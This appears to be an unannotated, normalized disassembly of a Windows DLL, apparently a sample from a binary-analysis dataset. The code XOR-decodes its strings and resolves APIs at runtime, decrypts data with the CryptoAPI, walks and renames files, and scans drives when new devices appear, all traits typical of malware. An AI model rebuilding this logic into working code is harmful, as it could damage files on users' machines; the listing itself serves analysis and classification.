sub_10001000
push ebp
mov ebp esp
sub esp 0x10
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
push edi
push 0xa
lea eax [ ebp - 0xc ]
push eax
mov esi edx
push ecx
mov [ ebp - 0x10 ] esi
call sub_10002bae
lea ecx [ ebp - 0xc ]
add esp 0xc
lea edx [ ecx + 0x1 ]
lea esp [ esp ]
mov al [ ecx ]
inc ecx
test al al
jne r-xdata
sub ecx edx
xor edi edi
mov eax 0x20
mov [ ebp + ecx - 0xc ] ax
cmp [ ebp + 0x8 ] edi
jle r-xdata
push 0x100
push 0x0
push rw-data
call sub_10006eb0
lea ecx [ ebp - 0xc ]
add esp 0xc
lea edx [ ecx + 0x1 ]
lea ebx [ ebx ]
push ebx
lea ebx [ ebp - 0xc ]
lea ecx [ ebx + 0x1 ]
mov al [ ecx ]
inc ecx
test al al
jne r-xdata
sub ecx edx
lea edx [ ecx + esi ]
add edx edi
mov ecx edx
lea esi [ ecx + 0x1 ]
mov al [ ebx ]
inc ebx
test al al
jne r-xdata
sub ebx ecx
lea ebx [ ebx ]
mov al [ ecx ]
inc ecx
test al al
jne r-xdata
sub ecx esi
push ecx
push edx
push rw-data
call sub_100077a0
mov ecx rw-data
add esp 0xc
xor edx edx
xor esi esi
lea edi [ ecx + 0x1 ]
cmp esi 0xfffffffc
je r-xdata
lea ecx [ ecx ]
mov al [ ecx ]
inc ecx
test al al
jne r-xdata
sub ecx edi
test ecx ecx
jle r-xdata
mov esi [ ebp - 0x10 ]
pop ebx
mov al [ ecx ]
cmp al [ edx ]
jne r-xdata
add ecx 0x4
add edx 0x4
sub esi 0x4
jae r-xdata
push rw-data
call sub_10002c30
mov ecx [ ebp - 0x4 ]
add esp 0x4
xor ecx ebp
pop edi
mov eax rw-data
pop esi
call sub_10002b9f
mov esp ebp
pop ebp
retn 0x4
xor eax eax
cmp edx 0x7
cmovg edx eax
inc edx
mov al [ edx + rw-data ]
xor [ esi + rw-data ] al
mov eax rw-data
inc esi
lea edi [ eax + 0x1 ]
mov esi [ ebp - 0x10 ]
inc edi
cmp edi [ ebp + 0x8 ]
jl r-xdata
cmp esi 0xfffffffd
je r-xdata
mov eax [ ecx ]
cmp eax [ edx ]
jne r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edi
cmp esi eax
jl r-xdata
lea ecx [ esi + edi ]
mov esi ebx
lea edx [ ebp - 0xc ]
sub esi 0x4
jb r-xdata
mov al [ ecx + 0x1 ]
cmp al [ edx + 0x1 ]
jne r-xdata
cmp esi 0xfffffffe
je r-xdata
mov al [ ecx + 0x2 ]
cmp al [ edx + 0x2 ]
jne r-xdata
cmp esi 0xffffffff
je r-xdata
mov al [ ecx + 0x3 ]
cmp al [ edx + 0x3 ]
je r-xdata
sub_10001180
push ebp
mov ebp esp
sub esp 0xc
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push 0xa
lea eax [ ebp - 0xc ]
push eax
push ecx
call sub_10002bae
lea ecx [ ebp - 0xc ]
add esp 0xc
lea edx [ ecx + 0x1 ]
mov al [ ecx ]
inc ecx
test al al
jne r-xdata
push ebx
sub ecx edx
push esi
mov eax 0x20
lea ebx [ ebp - 0xc ]
push edi
mov [ ebp + ecx - 0xc ] ax
xor edi edi
lea ecx [ ebx + 0x1 ]
mov al [ ebx ]
inc ebx
test al al
jne r-xdata
sub ebx ecx
lea esp [ esp ]
cmp esi 0xfffffffc
je r-xdata
mov ecx [ edx ]
cmp ecx [ eax ]
jne r-xdata
push 0x100
push 0x0
push rw-data
call sub_10006eb0
push 0x200
push 0x0
push rw-data
call sub_10006eb0
lea edx [ edi + rw-data ]
add esp 0x18
add edx ebx
mov ecx edx
lea esi [ ecx + 0x1 ]
mov edi edi
mov cl [ edx ]
cmp cl [ eax ]
jne r-xdata
add edx 0x4
add eax 0x4
sub esi 0x4
jae r-xdata
mov al [ ecx ]
inc ecx
test al al
jne r-xdata
sub ecx esi
push ecx
push edx
push rw-data
call sub_100077a0
mov ecx rw-data
add esp 0xc
xor edx edx
xor esi esi
lea edi [ ecx + 0x1 ]
inc edi
cmp edi 0x12c
jl r-xdata
cmp esi 0xfffffffd
je r-xdata
mov al [ ecx ]
inc ecx
test al al
jne r-xdata
sub ecx edi
test ecx ecx
jle r-xdata
mov esi ebx
lea edx [ edi + rw-data ]
lea eax [ ebp - 0xc ]
sub esi 0x4
jb r-xdata
mov cl [ edx + 0x1 ]
cmp cl [ eax + 0x1 ]
jne r-xdata
push rw-data
call sub_10002c30
mov esi [ MultiByteToWideChar@IAT ]
add esp 0x4
push 0x0
push rw-data
push 0xffffffff
push rw-data
push 0x0
push 0x0
call esi
push eax
push rw-data
push 0xffffffff
push rw-data
push 0x0
push 0x0
call esi
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
mov eax rw-data
pop ebx
call sub_10002b9f
mov esp ebp
pop ebp
retn 0x4
xor eax eax
cmp edx 0x7
cmovg edx eax
mov ecx rw-data
mov al [ edx + rw-data ]
xor [ esi + rw-data ] al
inc edx
inc esi
lea edi [ ecx + 0x1 ]
nop
cmp esi 0xfffffffe
je r-xdata
mov al [ ecx ]
inc ecx
test al al
jne r-xdata
sub ecx edi
cmp esi ecx
jl r-xdata
mov cl [ edx + 0x2 ]
cmp cl [ eax + 0x2 ]
jne r-xdata
cmp esi 0xffffffff
je r-xdata
mov cl [ edx + 0x3 ]
cmp cl [ eax + 0x3 ]
je r-xdata
sub_10001310
push ebp
mov ebp esp
sub esp 0x8
push esi
push edi
mov edi [ edx ]
mov eax ecx
xor esi esi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
test edi edi
jle r-xdata
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x8
push ebx
mov ebx [ eax ]
jmp r-xdata
mov eax [ ebx + esi ]
cmp eax [ rw-data ]
jne r-xdata
inc esi
cmp esi edi
jl r-xdata
mov eax [ ebx + esi + 0x4 ]
cmp eax [ rw-data ]
je r-xdata
pop ebx
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x8
mov eax [ ebp + 0x8 ]
test eax eax
jne r-xdata
push esi
push ebx
push eax
call sub_100077a0
mov eax [ ebp + 0xc ]
mov ecx [ ebp - 0x4 ]
mov [ eax ] esi
lea eax [ ebx + 0x8 ]
add eax esi
add esp 0xc
mov [ ecx ] eax
mov eax [ ebp - 0x8 ]
sub edi esi
sub edi 0x8
mov [ eax ] edi
pop ebx
mov eax [ ebp + 0xc ]
pop ebx
pop edi
mov [ eax ] esi
pop esi
mov esp ebp
pop ebp
retn 0x8
sub_100013a0
push ebp
mov ebp esp
sub esp 0x20
push ebx
push esi
mov eax edx
push edi
mov edi [ eax ]
mov ebx ecx
xor esi esi
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x14 ] ebx
test edi edi
jle r-xdata
push 0x3e8
call sub_10002c90
mov esi [ ebp - 0x10 ]
add esp 0x4
lea ecx [ ebp - 0xc ]
push ecx
push eax
mov edx esi
mov ecx ebx
mov [ ebp - 0x18 ] eax
call sub_10001310
mov ecx [ esi ]
cmp ecx 0x400
jg r-xdata
mov ecx [ ebx ]
lea ecx [ ecx ]
mov edi 0x400
cmp ecx 0x200
jg r-xdata
inc esi
cmp esi edi
jl r-xdata
mov eax [ ecx + esi + 0x4 ]
cmp eax [ rw-data ]
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
lea eax [ ebp - 0x1c ]
push eax
push 0x0
push 0x0
push [ ebp - 0xc ]
push [ ebp - 0x18 ]
push [ ebp - 0x4 ]
call [ CryptImportKey@IAT ]
test eax eax
je r-xdata
mov edi 0x200
jmp r-xdata
cmp ecx 0x100
jg r-xdata
mov eax [ ecx + esi ]
cmp eax [ rw-data ]
jne r-xdata
jmp r-xdata
mov [ ebp - 0xc ] esi
mov eax [ esi ]
xor edx edx
div edi
xor ecx ecx
test edx edx
setne cl
xor esi esi
xor ebx ebx
mov [ ebp - 0x20 ] edx
dec ecx
add ecx eax
mov [ ebp - 0xc ] ecx
cmp esi ecx
mov ebx [ CryptAcquireContextW@IAT ]
push 0x10
push 0x1
push r--data
push r--data
lea eax [ ebp - 0x4 ]
push eax
call ebx
push 0x8
push 0x1
push r--data
push r--data
lea eax [ ebp - 0x4 ]
push eax
call ebx
test eax eax
je r-xdata
mov edi 0x100
jmp r-xdata
cmp ecx 0x80
jg r-xdata
mov [ ebp - 0x8 ] edi
mov [ ebp - 0x8 ] edx
test edx edx
jne r-xdata
mov edi 0x80
jmp r-xdata
cmp ecx 0x40
jg r-xdata
mov ecx [ ebp - 0xc ]
add ebx [ ebp - 0x8 ]
mov edx [ ebp - 0x20 ]
inc esi
cmp esi ecx
jbe r-xdata
lea eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
add eax ebx
push eax
xor eax eax
cmp esi ecx
sete al
push 0x0
push eax
push 0x0
push [ ebp - 0x1c ]
call [ CryptDecrypt@IAT ]
test eax eax
je r-xdata
mov edi 0x40
jmp r-xdata
mov edi 0x20
mov eax 0x10
cmp ecx edi
cmovle edi eax
jmp r-xdata
jne r-xdata
mov esi [ ebp - 0x10 ]
mov eax [ esi ]
sub eax ebx
push eax
mov eax [ ebp - 0x14 ]
push 0x0
mov eax [ eax ]
add eax ebx
push eax
call sub_10006eb0
push [ ebp - 0x18 ]
mov [ esi ] ebx
call j_sub_100031b5
add esp 0x10
push [ ebp - 0x1c ]
call [ CryptDestroyKey@IAT ]
push 0x10
push 0x1
push r--data
push r--data
lea eax [ ebp - 0x4 ]
push eax
call [ CryptAcquireContextW@IAT ]
push 0x0
push [ ebp - 0x4 ]
call [ CryptReleaseContext@IAT ]
sub_10001570
push esi
push edi
test ecx ecx
je r-xdata
push [ rw-data ]
call [ rw-data ]
push [ rw-data ]
call [ rw-data ]
push [ rw-data ]
call [ rw-data ]
push [ rw-data ]
call [ rw-data ]
push [ rw-data ]
call [ rw-data ]
push 0x3b4
mov edx rw-data
xor ecx ecx
call sub_10001000
mov edi [ LoadLibraryA@IAT ]
push eax
call edi
mov [ rw-data ] eax
test eax eax
je r-xdata
pop edi
xor eax eax
pop esi
retn
push 0x3b4
mov edx rw-data
mov ecx 0x1
call sub_10001000
mov esi [ GetProcAddress@IAT ]
push eax
push [ rw-data ]
call esi
mov [ rw-data ] eax
test eax eax
je r-xdata
push 0x3b4
mov edx rw-data
mov ecx 0x2
call sub_10001000
push eax
push [ rw-data ]
call esi
mov [ rw-data ] eax
test eax eax
je r-xdata
push 0x3b4
mov edx rw-data
mov ecx 0x3
call sub_10001000
push eax
push [ rw-data ]
call [ rw-data ]
mov [ rw-data ] eax
test eax eax
je r-xdata
push 0x3b4
mov edx rw-data
mov ecx 0x4
call sub_10001000
push eax
push [ rw-data ]
call esi
mov [ rw-data ] eax
test eax eax
je r-xdata
push 0x3b4
mov edx rw-data
mov ecx 0x5
call sub_10001000
push eax
push [ rw-data ]
call [ rw-data ]
mov [ rw-data ] eax
test eax eax
je r-xdata
push 0x3b4
mov edx rw-data
mov ecx 0x6
call sub_10001000
push eax
push [ rw-data ]
call [ rw-data ]
mov [ rw-data ] eax
test eax eax
je r-xdata
push 0x3b4
mov edx rw-data
mov ecx 0x7
call sub_10001000
push eax
push [ rw-data ]
call [ rw-data ]
mov [ rw-data ] eax
test eax eax
je r-xdata
push 0x3b4
mov edx rw-data
mov ecx 0x8
call sub_10001000
push eax
push [ rw-data ]
call [ rw-data ]
mov [ rw-data ] eax
test eax eax
je r-xdata
push 0x3b4
mov edx rw-data
mov ecx 0x9
call sub_10001000
push eax
push [ rw-data ]
call [ rw-data ]
mov [ rw-data ] eax
test eax eax
je r-xdata
push 0x3b4
mov edx rw-data
mov ecx 0xa
call sub_10001000
push eax
push [ rw-data ]
call [ rw-data ]
mov [ rw-data ] eax
test eax eax
je r-xdata
push 0x3b4
mov edx rw-data
mov ecx 0xb
call sub_10001000
push eax
push [ rw-data ]
call [ rw-data ]
mov [ rw-data ] eax
test eax eax
je r-xdata
push 0x3b4
mov edx rw-data
mov ecx 0xc
call sub_10001000
push eax
push [ rw-data ]
call [ rw-data ]
mov [ rw-data ] eax
test eax eax
je r-xdata
push 0x3b4
mov edx rw-data
mov ecx 0xd
call sub_10001000
push eax
push [ rw-data ]
call [ rw-data ]
mov [ rw-data ] eax
test eax eax
je r-xdata
push 0x3b4
mov edx rw-data
mov ecx 0xe
call sub_10001000
push eax
push [ rw-data ]
call [ rw-data ]
mov [ rw-data ] eax
test eax eax
je r-xdata
push 0x3b4
mov edx rw-data
mov ecx 0xf
call sub_10001000
push eax
push [ rw-data ]
call [ rw-data ]
mov [ rw-data ] eax
test eax eax
je r-xdata
push 0x3b4
mov edx rw-data
mov ecx 0x10
call sub_10001000
push eax
push [ rw-data ]
call [ rw-data ]
mov [ rw-data ] eax
test eax eax
je r-xdata
push 0x3b4
mov edx rw-data
mov ecx 0x11
call sub_10001000
push eax
push [ rw-data ]
call [ rw-data ]
mov [ rw-data ] eax
test eax eax
je r-xdata
push 0x3b4
mov edx rw-data
mov ecx 0x12
call sub_10001000
push eax
push [ rw-data ]
call [ rw-data ]
mov [ rw-data ] eax
test eax eax
je r-xdata
push 0x3b4
mov edx rw-data
mov ecx 0x13
call sub_10001000
push eax
push [ rw-data ]
call [ rw-data ]
mov [ rw-data ] eax
test eax eax
je r-xdata
push 0x3b4
mov edx rw-data
mov ecx 0x14
call sub_10001000
push eax
push [ rw-data ]
call [ rw-data ]
mov [ rw-data ] eax
test eax eax
je r-xdata
push 0x3b4
mov edx rw-data
mov ecx 0x15
call sub_10001000
push eax
push [ rw-data ]
call [ rw-data ]
mov [ rw-data ] eax
test eax eax
je r-xdata
push 0x3b4
mov edx rw-data
mov ecx 0x16
call sub_10001000
push eax
push [ rw-data ]
call [ rw-data ]
mov [ rw-data ] eax
test eax eax
je r-xdata
push 0x3b4
mov edx rw-data
mov ecx 0x17
call sub_10001000
push eax
push [ rw-data ]
call [ rw-data ]
mov [ rw-data ] eax
test eax eax
je r-xdata
push 0x3b4
mov edx rw-data
mov ecx 0x18
call sub_10001000
push eax
push [ rw-data ]
call [ rw-data ]
mov [ rw-data ] eax
test eax eax
je r-xdata
push 0x3b4
mov edx rw-data
mov ecx 0x19
call sub_10001000
push eax
push [ rw-data ]
call [ rw-data ]
mov [ rw-data ] eax
test eax eax
je r-xdata
push 0x3b4
mov edx rw-data
mov ecx 0x1a
call sub_10001000
push eax
push [ rw-data ]
call [ rw-data ]
mov [ rw-data ] eax
test eax eax
je r-xdata
push 0x3b4
mov edx rw-data
mov ecx 0x1b
call sub_10001000
push eax
push [ rw-data ]
call [ rw-data ]
mov [ rw-data ] eax
test eax eax
je r-xdata
push 0x3b4
mov edx rw-data
mov ecx 0x1c
call sub_10001000
push eax
push [ rw-data ]
call [ rw-data ]
mov [ rw-data ] eax
test eax eax
je r-xdata
push 0x3b4
mov edx rw-data
mov ecx 0x1d
call sub_10001000
push eax
push [ rw-data ]
call [ rw-data ]
mov [ rw-data ] eax
test eax eax
je r-xdata
push 0x3b4
mov edx rw-data
mov ecx 0x1e
call sub_10001000
push eax
push [ rw-data ]
call [ rw-data ]
mov [ rw-data ] eax
test eax eax
je r-xdata
push 0x3b4
mov edx rw-data
mov ecx 0x1f
call sub_10001000
push eax
call [ rw-data ]
mov [ rw-data ] eax
test eax eax
je r-xdata
push 0x3b4
mov edx rw-data
mov ecx 0x20
call sub_10001000
push eax
push [ rw-data ]
call esi
mov [ rw-data ] eax
test eax eax
je r-xdata
push 0x3b4
mov edx rw-data
mov ecx 0x21
call sub_10001000
push eax
push [ rw-data ]
call esi
mov [ rw-data ] eax
test eax eax
je r-xdata
push 0x3b4
mov edx rw-data
mov ecx 0x22
call sub_10001000
push eax
push [ rw-data ]
call [ rw-data ]
mov [ rw-data ] eax
test eax eax
je r-xdata
push 0x3b4
mov edx rw-data
mov ecx 0x23
call sub_10001000
push eax
push [ rw-data ]
call esi
mov [ rw-data ] eax
test eax eax
je r-xdata
push 0x3b4
mov edx rw-data
mov ecx 0x24
call sub_10001000
push eax
push [ rw-data ]
call [ rw-data ]
mov [ rw-data ] eax
test eax eax
je r-xdata
push 0x3b4
mov edx rw-data
mov ecx 0x25
call sub_10001000
push eax
call edi
mov [ rw-data ] eax
test eax eax
je r-xdata
push 0x3b4
mov edx rw-data
mov ecx 0x26
call sub_10001000
push eax
push [ rw-data ]
call esi
mov [ rw-data ] eax
test eax eax
je r-xdata
push 0x3b4
mov edx rw-data
mov ecx 0x27
call sub_10001000
push eax
push [ rw-data ]
call esi
mov [ rw-data ] eax
test eax eax
je r-xdata
push 0x3b4
mov edx rw-data
mov ecx 0x28
call sub_10001000
push eax
push [ rw-data ]
call [ rw-data ]
mov [ rw-data ] eax
test eax eax
je r-xdata
push 0x3b4
mov edx rw-data
mov ecx 0x29
call sub_10001000
push eax
push [ rw-data ]
call esi
mov [ rw-data ] eax
test eax eax
je r-xdata
push 0x3b4
mov edx rw-data
mov ecx 0x2a
call sub_10001000
push eax
push [ rw-data ]
call [ rw-data ]
mov [ rw-data ] eax
test eax eax
je r-xdata
push 0x3b4
mov edx rw-data
mov ecx 0x2b
call sub_10001000
push eax
push [ rw-data ]
call [ rw-data ]
mov [ rw-data ] eax
test eax eax
je r-xdata
push 0x3b4
mov edx rw-data
mov ecx 0x2c
call sub_10001000
push eax
push [ rw-data ]
call [ rw-data ]
mov [ rw-data ] eax
test eax eax
je r-xdata
push 0x3b4
mov edx rw-data
mov ecx 0x2d
call sub_10001000
push eax
push [ rw-data ]
call [ rw-data ]
mov [ rw-data ] eax
test eax eax
je r-xdata
push 0x3b4
mov edx rw-data
mov ecx 0x2e
call sub_10001000
push eax
call edi
mov [ rw-data ] eax
test eax eax
je r-xdata
push 0x3b4
mov edx rw-data
mov ecx 0x2f
call sub_10001000
push eax
push [ rw-data ]
call esi
mov [ rw-data ] eax
test eax eax
je r-xdata
push 0x3b4
mov edx rw-data
mov ecx 0x30
call sub_10001000
push eax
call edi
mov [ rw-data ] eax
test eax eax
je r-xdata
push 0x3b4
mov edx rw-data
mov ecx 0x31
call sub_10001000
push eax
push [ rw-data ]
call esi
mov [ rw-data ] eax
test eax eax
jne r-xdata
pop edi
mov eax 0x1
pop esi
retn
sub_10001e60
push ebp
mov ebp esp
sub esp 0x8ec
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
mov eax ecx
push rw-data
mov edi edx
push eax
mov [ ebp - 0x8dc ] edi
mov [ ebp - 0x8cc ] eax
mov [ ebp - 0x8d8 ] 0x1
call [ rw-data ]
neg eax
sbb ebx ebx
neg ebx
push edi
mov [ ebp - 0x8d4 ] ebx
mov ebx [ ebp - 0x8cc ]
push ebx
lea eax [ ebp - 0x418 ]
push r--data
push eax
call [ rw-data ]
add esp 0x10
push esi
call [ rw-data ]
lea ecx [ ebx + 0x4 ]
push ecx
lea edi [ eax + 0x1 ]
push esi
mov [ ebp - 0x8e0 ] edi
call [ rw-data ]
push 0x0
push esi
call [ rw-data ]
test eax eax
jne r-xdata
push 0x6
push esi
call [ rw-data ]
call [ rw-data ]
test eax eax
je r-xdata
push ebx
lea eax [ ebp - 0x210 ]
push r--data
push eax
call [ rw-data ]
add esp 0xc
lea eax [ ebp - 0x8c8 ]
push eax
lea eax [ ebp - 0x210 ]
push eax
call [ rw-data ]
mov ebx [ ebp - 0x8d4 ]
mov edi eax
test [ ebp - 0x678 ] 0x10
jne r-xdata
cmp eax 0x50
je r-xdata
test ebx ebx
je r-xdata
test [ ebp - 0x8c8 ] 0x10
je r-xdata
lea eax [ ebp - 0x678 ]
push eax
push edi
call [ rw-data ]
test eax eax
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
push esi
call [ rw-data ]
mov [ ebp - 0x8e4 ] eax
lea eax [ ebp - 0x678 ]
push eax
lea eax [ ebp - 0x418 ]
push eax
call [ rw-data ]
mov edi eax
mov [ ebp - 0x8d0 ] edi
cmp eax 0xb7
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10002b9f
mov esp ebp
pop ebp
retn 0x10
push [ ebp - 0x8cc ]
call [ rw-data ]
lea eax [ ebp - 0x8c8 ]
push eax
push edi
call [ rw-data ]
test eax eax
jne r-xdata
push r--data
lea eax [ ebp - 0x89c ]
push eax
call [ rw-data ]
test eax eax
je r-xdata
cmp edi 0xffffffff
je r-xdata
push edi
call [ FindClose@IAT ]
mov ecx [ ebp + 0x14 ]
test ecx ecx
jl r-xdata
lea eax [ ebp - 0x64c ]
push eax
call [ rw-data ]
push eax
push [ rw-data ]
call [ StrStrIW@IAT ]
test eax eax
jne r-xdata
xor eax eax
mov [ esi + edi * 2 ] ax
jmp r-xdata
cmp edi 0xffffffff
je r-xdata
push edi
call [ rw-data ]
push r--data
lea eax [ ebp - 0x89c ]
push eax
call [ rw-data ]
test eax eax
je r-xdata
push 0x208
lea eax [ ebp - 0x210 ]
push 0x0
push eax
call [ rw-data ]
add esp 0xc
lea eax [ ebp - 0x428 ]
push eax
lea eax [ ebp - 0x664 ]
push eax
call [ rw-data ]
lea eax [ ebp - 0x64c ]
push eax
push ebx
lea eax [ ebp - 0x210 ]
push r--data
push eax
call [ rw-data ]
mov eax [ ebp - 0x8e4 ]
xor ecx ecx
add esp 0x10
mov [ esi + eax * 2 ] cx
lea eax [ ebp - 0x64c ]
push eax
push esi
call [ rw-data ]
push 0x1
push esi
lea eax [ ebp - 0x210 ]
push eax
call [ rw-data ]
mov ebx eax
test ebx ebx
jne r-xdata
mov eax [ ebp + 0x10 ]
jg r-xdata
lea eax [ ebp - 0x89c ]
push eax
push [ ebp - 0x8cc ]
lea eax [ ebp - 0x418 ]
push r--data
push eax
call [ rw-data ]
mov eax [ ebp - 0x8e0 ]
mov edx [ ebp - 0x8dc ]
add esp 0x10
xor ecx ecx
push [ ebp + 0x14 ]
mov [ esi + eax * 2 - 0x2 ] cx
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x418 ]
push ebx
push esi
call sub_10001e60
cmp [ ebp - 0x8d4 ] 0x0
je r-xdata
call [ rw-data ]
cmp eax 0x50
je r-xdata
cmp ecx [ ebp - 0x660 ]
jg r-xdata
test eax eax
je r-xdata
cmp [ ebp - 0x8d8 ] 0x0
je r-xdata
lea eax [ ebp - 0x210 ]
push eax
call [ rw-data ]
push 0x0
push 0x80
push 0x3
push 0x0
push 0x1
push 0x1
push esi
call [ rw-data ]
mov edi eax
cmp edi 0xffffffff
je r-xdata
cmp eax 0xb7
jne r-xdata
jl r-xdata
mov ebx [ ebp - 0x8cc ]
test ebx ebx
je r-xdata
push 0x0
push esi
lea eax [ ebp - 0x210 ]
push eax
call [ rw-data ]
mov ebx eax
lea eax [ ebp - 0x8ec ]
push eax
push 0x0
push 0x0
push edi
call [ rw-data ]
mov eax [ ebp - 0x8e8 ]
cmp eax [ ebp - 0x660 ]
jne r-xdata
cmp eax [ ebp - 0x664 ]
ja r-xdata
push 0x6
push esi
call [ rw-data ]
movzx eax [ ebp - 0x41a ]
push eax
movzx eax [ ebp - 0x41c ]
push eax
movzx eax [ ebp - 0x41e ]
push eax
movzx eax [ ebp - 0x420 ]
push eax
movzx eax [ ebp - 0x422 ]
push eax
movzx eax [ ebp - 0x426 ]
push eax
movzx eax [ ebp - 0x428 ]
push eax
push r--data
push esi
call [ rw-data ]
lea eax [ esi + eax * 2 ]
push eax
call [ rw-data ]
add esp 0x24
lea eax [ ebp - 0x210 ]
push 0x1
push esi
push eax
call [ rw-data ]
push edi
mov ebx eax
call [ rw-data ]
jmp r-xdata
mov eax [ ebp - 0x8ec ]
cmp eax [ ebp - 0x664 ]
jne r-xdata
mov edi [ ebp - 0x8d0 ]
push edi
mov [ ebp - 0x8d8 ] 0x0
call [ rw-data ]
jmp r-xdata
sub_10002270
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x224
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x220 ] eax
xor eax eax
push ebx
mov ebx [ ebp + 0x8 ]
push 0x206
push eax
mov [ esp + 0x18 ] ax
mov [ esp + 0x1a ] eax
mov [ esp + 0x1e ] ax
mov [ esp + 0x20 ] ax
lea eax [ esp + 0x22 ]
push eax
mov [ esp + 0x18 ] 0x0
mov [ esp + 0x14 ] 0x0
call sub_10006eb0
add esp 0xc
movsx eax bl
push eax
lea eax [ esp + 0x14 ]
push r--data
push eax
call [ rw-data ]
add esp 0xc
lea eax [ esp + 0xc ]
push 0x0
push 0x0
push eax
push 0x0
lea eax [ esp + 0x18 ]
push eax
push 0x0
push 0x0
lea eax [ esp + 0x2c ]
push eax
call [ rw-data ]
mov eax [ rw-data ]
test eax eax
jne r-xdata
push eax
lea eax [ esp + 0x1c ]
push eax
call [ rw-data ]
lea eax [ esp + 0x18 ]
push eax
push 0x0
push 0x0
push 0x8027
push 0x0
call [ rw-data ]
xor ecx ecx
test eax eax
setns cl
test ecx ecx
jne r-xdata
push 0x6
lea eax [ esp + 0x1c ]
push eax
call [ rw-data ]
call [ rw-data ]
test eax eax
je r-xdata
push [ esp + 0x8 ]
lea eax [ esp + 0x1c ]
push r--data
push eax
call [ rw-data ]
lea eax [ esp + eax * 2 + 0x20 ]
push eax
call [ rw-data ]
add esp 0xc
lea eax [ esp + 0x18 ]
push 0x0
push eax
call [ rw-data ]
test eax eax
jne r-xdata
xor eax eax
pop ebx
mov ecx [ esp + 0x220 ]
xor ecx esp
call sub_10002b9f
mov esp ebp
pop ebp
retn 0x4
cmp eax 0x50
je r-xdata
push [ rw-data ]
lea eax [ esp + 0x1c ]
push [ rw-data ]
mov edx r--data
push 0x0
push eax
lea ecx [ esp + 0x20 ]
call sub_10001e60
mov ecx [ esp + 0x224 ]
pop ebx
xor ecx esp
xor eax eax
call sub_10002b9f
mov esp ebp
pop ebp
retn 0x4
cmp eax 0xb7
je r-xdata
xor eax eax
pop ebx
mov ecx [ esp + 0x220 ]
xor ecx esp
call sub_10002b9f
mov esp ebp
pop ebp
retn 0x4
sub_100023f0
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
sub eax 0x2
je r-xdata
push 0x0
call [ rw-data ]
xor eax eax
pop ebp
retn 0x10
push esi
mov esi [ ebp + 0x14 ]
sub eax 0x217
jne r-xdata
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ DefWindowProcW@IAT ]
pop esi
pop ebp
retn 0x10
cmp [ ebp + 0x10 ] 0x8000
jne r-xdata
cmp [ esi + 0x4 ] 0x2
jne r-xdata
movzx eax [ esi + 0x10 ]
cmp eax 0x1
je r-xdata
cmp eax 0x2
je r-xdata
mov ecx [ esi + 0xc ]
xor al al
lea ecx [ ebp + 0x14 ]
push ecx
add al 0x41
push 0x0
movsx eax al
push eax
push sub_10002270
push 0x0
push 0x0
call [ rw-data ]
inc al
shr ecx 0x1
cmp al 0x1a
jl r-xdata
test cl 0x1
jne r-xdata
sub_10002480
push ebp
mov ebp esp
sub esp 0x28
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
mov esi [ rw-data ]
push edi
push 0x20
lea eax [ ebp - 0x24 ]
push 0x0
push eax
mov edi edx
call [ rw-data ]
movq xmm0 [ ebp + 0x8 ]
add esp 0xc
lea eax [ ebp - 0x24 ]
push 0x0
movq [ ebp - 0x18 ] xmm0
movq xmm0 [ ebp + 0x10 ]
push eax
push esi
mov [ ebp - 0x24 ] 0x20
mov [ ebp - 0x20 ] 0x5
movq [ ebp - 0x10 ] xmm0
call [ rw-data ]
xor ecx ecx
test eax eax
setne cl
mov [ edi ] eax
pop edi
pop esi
mov eax ecx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10002b9f
mov esp ebp
pop ebp
retn 0x10
sub_10002520
push ebp
mov ebp esp
sub esp 0x1c
push r--data
push [ rw-data ]
call [ rw-data ]
push rw-data
push 0x1
mov [ rw-data ] eax
call eax
cmp eax 0x1
je r-xdata
lea esp [ esp ]
push 0x1
push 0x0
push 0x0
push 0x0
lea eax [ ebp - 0x1c ]
push eax
call [ rw-data ]
test eax eax
je r-xdata
mov eax 0x1
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x1c ]
push eax
call [ rw-data ]
push 0x1
push 0x0
push 0x0
push 0x0
lea eax [ ebp - 0x1c ]
push eax
call [ rw-data ]
test eax eax
jne r-xdata
cmp [ ebp - 0x18 ] 0x12
je r-xdata
sub_100025a0
push ebp
mov ebp esp
sub esp 0x22c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
push edi
xor eax eax
push 0x206
push eax
mov [ ebp - 0x210 ] ax
lea eax [ ebp - 0x20e ]
push eax
mov [ ebp - 0x22c ] 0x0
xor edi edi
call sub_10006eb0
add esp 0xc
lea eax [ ebp - 0x210 ]
push 0x104
push eax
push [ rw-data ]
call [ rw-data ]
lea eax [ ebp - 0x210 ]
push eax
call [ rw-data ]
push rw-data
lea eax [ ebp - 0x210 ]
push eax
call [ rw-data ]
push edi
push 0x80
push 0x3
push edi
push edi
push 0x80000000
lea eax [ ebp - 0x210 ]
push eax
call [ rw-data ]
mov esi eax
cmp esi 0xffffffff
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10002b9f
mov esp ebp
pop ebp
retn
push edi
push esi
call [ rw-data ]
mov ebx eax
lea eax [ ebx + 0x2 ]
push eax
push 0x8
push [ rw-data ]
call [ rw-data ]
